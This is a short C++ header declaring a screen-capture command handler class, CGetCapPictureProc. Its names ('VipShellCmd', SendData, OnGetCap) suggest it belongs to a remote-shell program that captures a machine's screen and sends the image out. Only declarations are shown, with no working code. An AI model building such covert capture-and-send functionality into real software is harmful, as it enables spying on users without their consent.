#pragma once
#include "defcommandproc.h"
#include ".\getcapdata.h"
class CGetCapPictureProc :
	public CDefCommandProc
{
	CGetCapData hGetCap;
public:
	bool SendData();
public:
	CGetCapPictureProc(void);
	~CGetCapPictureProc(void);
protected:
	virtual void OnCmd_GetDoWork(tagVipShellCmd* info);
	virtual void OnGetCap(tagVipShellCmd* info);
};